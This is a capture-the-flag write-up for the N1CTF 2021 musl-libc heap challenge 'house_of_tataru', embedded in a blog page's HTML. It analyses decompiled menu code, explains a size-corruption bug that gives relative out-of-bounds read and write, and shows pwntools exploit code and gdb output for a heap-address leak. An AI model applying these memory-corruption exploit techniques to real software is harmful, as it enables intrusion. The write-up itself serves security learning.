@@ -1,0 +1,949 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>N1CTF 2021 - house_of_tataru | kileak</title>
+
+
+
+
+
+<meta name="description" content="N1CTF 2021 - house_of_tataru">
+
+
+<meta name="keywords" content="n1ctf, house_of_tataru">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2021/n1ctf21-tataru/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">N1CTF 2021 - house_of_tataru</h1>
+      <p class="post-meta">Nov 21, 2021</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>House_of_tataru
+<!--break--></p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/n1ctf21/tataru/house_of_tataru.zip">house_of_tataru.zip</a> <a href="https://kileak.github.io/assets/n1ctf21/tataru/xpl.py">xpl.py</a></p>
+
+  <p>Team: Super Guesser</p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Tataru Taru wants to solo the boss,but she seems to have no way to do this alone, please help her!
+1.Summon a pet to fight with tataru.
+2.Order pet to leave the battlefield.
+3.Order pet to parpre for attacking the boss.
+4.Order pet to start attacking the boss.
+5.Order pet to attack tataru.
+The boss casts chaos and puts a lot of heap checks to the program!
+:</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Canary                        : ✓ (value: 0x99786e61501bce00)
+NX                            : ✓ 
+PIE                           : ✓ 
+Fortify                       : ✘ 
+RelRO                         : Full</code></pre></figure>
+
+<p>Tataru was a heap challenge based on <code class="language-plaintext highlighter-rouge">musl-libc</code>, which gave me a hard time, since I had nearly no experience with <code class="language-plaintext highlighter-rouge">musl-libc</code> at all.</p>
+
+<p>To be honest, even while doing this challenge, I avoided to really look into <code class="language-plaintext highlighter-rouge">musl</code> much, but solved this challenge in a more “ghetto way” instead by just analyzing everything in gdb, searching for good addresses and experimenting a lot.</p>
+
+<p>So, let’s take a look at the different functionalities:</p>
+
+<p><code class="language-plaintext highlighter-rouge">1.Summon a pet to fight with tataru.</code></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">case</span> <span class="sc">'1'</span><span class="p">:</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+    <span class="n">size</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
+
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="n">idx</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="kt">char</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="p">)</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        
+    <span class="n">ENTRIES</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+    
+    <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="mh">0x1000</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// some weird heap sanity check</span>
+        <span class="n">chunk</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">calloc</span> <span class="o">+</span> <span class="mh">0x114D8</span><span class="p">;</span>
+        <span class="k">do</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">chunk</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">chunk</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="o">**</span><span class="n">chunk</span> <span class="p">)</span> <span class="p">{</span>
+              <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"hacker!"</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
+              <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="o">++</span><span class="n">chunk</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">while</span> <span class="p">(</span> <span class="o">&amp;</span><span class="n">calloc</span> <span class="o">+</span> <span class="mh">0x11508</span> <span class="o">!=</span> <span class="n">chunk</span> <span class="p">);</span>
+        
+        <span class="c1">// create pet entry</span>
+        <span class="n">obj</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ENTRIES</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
+        <span class="n">obj</span><span class="o">-&gt;</span><span class="n">buffer</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+        <span class="n">obj</span><span class="o">-&gt;</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        
+        <span class="n">read_bytes</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">entry_buf</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span> <span class="n">read_bytes</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
+          <span class="n">obj</span><span class="o">-&gt;</span><span class="n">offset</span> <span class="o">+=</span> <span class="n">read_bytes</span><span class="p">;</span>
+        <span class="k">else</span>
+            <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"failed"</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"no more magic"</span><span class="p">,</span> <span class="mh">0xD</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">break</span><span class="p">;</span></code></pre></figure>
+
+<p>For creating a pet, we first have to send 4 bytes, which will be the size for the spell to use (<code class="language-plaintext highlighter-rouge">buffer</code>) and then one byte, which will be the index, at which the pet will be stored.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">Pet</span> <span class="p">{</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">buffer</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">offset</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>It will then allocate a spell buffer for it and read our input into it. The length of our input will be stored in <code class="language-plaintext highlighter-rouge">offset</code> and the initial size in <code class="language-plaintext highlighter-rouge">size</code>.</p>
+
+<p>And here’s already the main bug for this challenge: if we specify a size <code class="language-plaintext highlighter-rouge">&gt; 0x1000</code>, it will store the size in the pet object, but then bail out of the function with the message <code class="language-plaintext highlighter-rouge">no more magic</code> without reallocating the object.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">ENTRIES[idx].size = size;
+    
+if ( size &lt;= 0x1000 ) {
+...</code></pre></figure>
+
+<p>We can use this to create an object with a smaller size (for example <code class="language-plaintext highlighter-rouge">0x30</code>) and then call this function again with a size of <code class="language-plaintext highlighter-rouge">0x1200</code>, which will result in a pet, which has a <code class="language-plaintext highlighter-rouge">0x30</code> buffer allocated, but a <code class="language-plaintext highlighter-rouge">size</code> of <code class="language-plaintext highlighter-rouge">0x1200</code>. This will come in handy later on.</p>
+
+<p><code class="language-plaintext highlighter-rouge">2.Order pet to leave the battlefield.</code></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">case</span> <span class="sc">'2'</span><span class="p">:</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="n">idx</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="kt">char</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="p">)</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Tataru tripped your pet and you failed to order it!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">);</span>
+
+    <span class="n">ENTRIES</span><span class="p">[</span><span class="n">idx_2</span><span class="p">].</span><span class="n">offset</span> <span class="o">=</span> <span class="n">ENTRIES</span><span class="p">[</span><span class="n">idx_2</span><span class="p">].</span><span class="n">size</span><span class="p">;</span>
+
+    <span class="k">break</span><span class="p">;</span></code></pre></figure>
+
+<p>This will just set the <code class="language-plaintext highlighter-rouge">offset</code> of the object to <code class="language-plaintext highlighter-rouge">size</code>. This would normally prevent us to append more data to the buffer, since the append function will check, that <code class="language-plaintext highlighter-rouge">offset</code> is smaller than <code class="language-plaintext highlighter-rouge">size</code>.</p>
+
+<p>But as we’ve already seen, we will be able to manipulate <code class="language-plaintext highlighter-rouge">size</code> for the pet afterwards again, so we can abuse this to set <code class="language-plaintext highlighter-rouge">offset</code> to an arbitrary value.</p>
+
+<p><code class="language-plaintext highlighter-rouge">3.Order pet to parpre for attacking the boss.</code></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">case</span> <span class="sc">'3'</span><span class="p">:</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="n">idx</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="kt">char</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="p">)</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+    <span class="n">offset</span> <span class="o">=</span> <span class="n">ENTRIES</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">;</span>
+    <span class="n">stored_size</span> <span class="o">=</span> <span class="n">ENTRIES</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">offset</span> <span class="o">&gt;=</span> <span class="n">stored_size</span> <span class="p">)</span>
+        <span class="k">continue</span><span class="p">;</span>
+
+    <span class="n">obj</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ENTRIES</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
+
+    <span class="n">cur_pos</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">obj</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">[</span><span class="n">offset</span><span class="p">];</span>
+
+    <span class="c1">// mean oob write check :(</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">cur_pos</span> <span class="o">&gt;=</span> <span class="o">&amp;</span><span class="n">calloc</span> <span class="o">+</span> <span class="mh">0xFFFFAB76</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"hacker!"</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">read_bytes</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">cur_pos</span><span class="p">,</span> <span class="n">stored_size</span> <span class="o">-</span> <span class="n">offset</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">read_bytes</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="n">obj</span><span class="o">-&gt;</span><span class="n">offset</span> <span class="o">+=</span> <span class="n">read_bytes</span><span class="p">;</span>
+        <span class="k">continue</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"failed"</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
+    <span class="k">break</span><span class="p">;</span></code></pre></figure>
+
+<p>This option lets us append data to our pets spell <code class="language-plaintext highlighter-rouge">buffer</code> (at the current <code class="language-plaintext highlighter-rouge">offset</code>).</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">if</span> <span class="p">(</span> <span class="n">cur_pos</span> <span class="o">&gt;=</span> <span class="o">&amp;</span><span class="n">calloc</span> <span class="o">+</span> <span class="mh">0xFFFFAB76</span> <span class="p">)</span> <span class="p">{</span></code></pre></figure>
+
+<p>That check will however verify, that the current buffer offset is not bigger than <code class="language-plaintext highlighter-rouge">libc base</code> address, so no easy leaks or overwrites will be possible.</p>
+
+<p>This also results in some quirky behaviour of the challenge, since musl <em>will</em> allocate some chunks between <code class="language-plaintext highlighter-rouge">libc</code> and <code class="language-plaintext highlighter-rouge">stack</code> and the challenge will terminate, if you try to write to those chunks (though they aren’t corrupted or anything), which was kinda weird in the beginning.</p>
+
+<p>It’s also important to note here, that <code class="language-plaintext highlighter-rouge">read</code> will not segfault, if it tries to read into an unmapped memory region. We would just get a <code class="language-plaintext highlighter-rouge">"failed"</code> response from the challenge in that case.</p>
+
+<p><code class="language-plaintext highlighter-rouge">4.Order pet to start attacking the boss.</code></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">case</span> <span class="sc">'4'</span><span class="p">:</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="n">idx</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="kt">char</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="p">)</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+    <span class="n">obj</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ENTRIES</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="o">&amp;</span><span class="n">obj</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">[</span><span class="n">obj</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">calloc</span> <span class="o">+</span> <span class="mh">0xFFFD5BB0</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"hacker!"</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Tataru tripped your pet, your pet failed to use "</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">);</span>
+
+    <span class="n">buffer_offset</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">obj</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">[</span><span class="n">obj</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">];</span>
+    <span class="n">len_buffer</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buffer_offset</span><span class="p">);</span>
+    
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buffer_offset</span><span class="p">,</span> <span class="n">len_buffer</span><span class="p">);</span>
+
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">" to attack the boss</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">);</span>
+    <span class="k">break</span><span class="p">;</span></code></pre></figure>
+
+<p>This is pretty much a leaking function. It will print out the string at <code class="language-plaintext highlighter-rouge">buffer+offset</code>. But again, this will also check, that the address is not bigger than base address of <code class="language-plaintext highlighter-rouge">libc</code>, which made it quite hard to get any useful leaks except heap addresses.</p>
+
+<p><code class="language-plaintext highlighter-rouge">5.Order pet to attack tataru.</code></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">case</span> <span class="sc">'5'</span><span class="p">:</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"You have defeated tataru, you have won!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span></code></pre></figure>
+
+<p>This will just quit the application, which could be useful, if you’d manage to write a ropchain on the stack and return into it. But I didn’t find a way to leak a stack address, so didn’t use it all.</p>
+
+<p>So, the main bug in this challenge is the fact, that we can change the <code class="language-plaintext highlighter-rouge">size</code> of an already allocated chunk without reallocating it.</p>
+
+<p>With this we can simply overflow the spell buffer chunk. But combining this with option <code class="language-plaintext highlighter-rouge">2</code>, which sets the <code class="language-plaintext highlighter-rouge">offset</code> to current <code class="language-plaintext highlighter-rouge">size</code>, we can even do an arbitrary “relative” oob write and read.</p>
+
+<ul>
+  <li>Allocate a chunk with size &lt; <code class="language-plaintext highlighter-rouge">0x1000</code></li>
+  <li>Call option 1 again with size = relative offset to write to</li>
+  <li>Call option 2 to set <code class="language-plaintext highlighter-rouge">offset</code> to current <code class="language-plaintext highlighter-rouge">size</code></li>
+  <li>Call option 1 again and set size to a bigger value</li>
+  <li>Can now write or read to it</li>
+</ul>
+
+<p>Let’s start with a heap leak:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">summon</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+    
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="n">size</span><span class="p">:</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">set_size</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">set_cursize</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">prepare</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">sendline</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    
+    <span class="k">if</span> <span class="n">sendline</span><span class="p">:</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"4"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"use "</span><span class="p">)</span>
+    <span class="n">LEAK</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" to attack"</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">LEAK</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span>
+
+    <span class="c1"># create some chunks in slot 1
+</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+        <span class="n">summon</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
+
+    <span class="c1"># create another chunk in slot 0
+</span>    <span class="n">summon</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
+
+    <span class="c1"># overwrite size of slot 0
+</span>    <span class="n">set_size</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1010</span><span class="p">)</span>
+
+    <span class="c1"># align slot 0 buffer with heap address on bss
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x2e0</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>    
+    <span class="n">prepare</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+    <span class="c1"># read heap address from bss
+</span>    <span class="n">LEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+    <span class="n">HEAP</span> <span class="o">=</span> <span class="n">LEAK</span> <span class="o">-</span> <span class="mh">0xb8</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"HEAP leak       : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LEAK</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"HEAP base       : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">HEAP</span><span class="p">))</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+    
+    <span class="k">return</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">musl</code> tries to optimize memory usage and will also reuse unused memory from <code class="language-plaintext highlighter-rouge">bss</code>.</p>
+
+<p>After allocating 5 chunks (which were served from a region behind libc), the 6th chunk was allocated on <code class="language-plaintext highlighter-rouge">bss</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x0000555555558000
+0x555555558000:	0x0000555555558000	0x0000000000000000
+0x555555558010:	0x0000000000000000	0x0000000000000000
+0x555555558020:	0x0000000000000000	0x0000000000000000
+0x555555558030:	0x0000000000000000	0x0000000000000000
+0x555555558040:	0x0000555555558cb0	0x0000000000001010 &lt;- slot 0 buffer / size
+0x555555558050:	0x00000000000002e0	0x00007ffff7ffede0 &lt;- slot 0 offset / slot 1 buffer
+0x555555558060:	0x0000000000000040	0x0000000000000001 &lt;- slot 1 size / slot 1 offset
+0x555555558070:	0x0000000000000000	0x0000000000000000
+0x555555558080:	0x0000000000000000	0x0000000000000000
+
+gef➤  x/30gx 0x0000555555558cb0+0x2e0
+0x555555558f90:	0x000055555555a0b8	0x0000ff0000000000 &lt;- musl heap address
+0x555555558fa0:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>By corrupting the size of the first pet, we can align it’s buffer to the heap address and leak it.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] HEAP leak       : 0x55555555a0b8
+[*] HEAP base       : 0x55555555a000</code></pre></figure>
+
+<p>Since options 2-5 all had those pesky libc checks, we couldn’t use those to get a buffer in or behind <code class="language-plaintext highlighter-rouge">libc</code>.</p>
+
+<p>Only option 1 doesn’t check the buffer address before writing to it, so I was determined that the only way to get a write into <code class="language-plaintext highlighter-rouge">libc</code> was to exploit musls allocation to serve us a buffer inside <code class="language-plaintext highlighter-rouge">libc</code>.</p>
+
+<p>But for corrupting anything in musls arenas, we would need to be able to calculate the offset from a chunk on <code class="language-plaintext highlighter-rouge">bss</code> to an address on the <code class="language-plaintext highlighter-rouge">heap</code>, where musls metadata was stored. For this, we’d need to get a leak for <code class="language-plaintext highlighter-rouge">bss</code> first…</p>
+
+<p>Sounds easy, but getting this leak took me the most time.</p>
+
